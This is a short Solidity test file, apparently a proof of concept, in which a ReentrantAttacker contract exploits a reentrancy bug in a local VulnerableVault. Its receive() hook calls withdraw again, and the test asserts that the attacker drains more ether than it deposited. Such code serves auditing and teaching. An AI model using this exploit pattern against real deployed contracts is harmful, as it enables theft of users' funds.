// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/VulnerableVault.sol";

contract ReentrantAttacker {
    VulnerableVault public vault;
    uint256 public reentered;

    constructor(VulnerableVault target) {
        vault = target;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (reentered == 0 && address(vault).balance >= 1 ether) {
            reentered = 1;
            vault.withdraw();
        }
    }
}

contract PoCTest {
    function testReentrantWithdraw() public {
        VulnerableVault vault = new VulnerableVault();
        ReentrantAttacker attacker = new ReentrantAttacker(vault);

        vault.deposit{value: 2 ether}();
        attacker.attack{value: 1 ether}();

        assert(address(attacker).balance > 1 ether);
    }

    receive() external payable {}
}

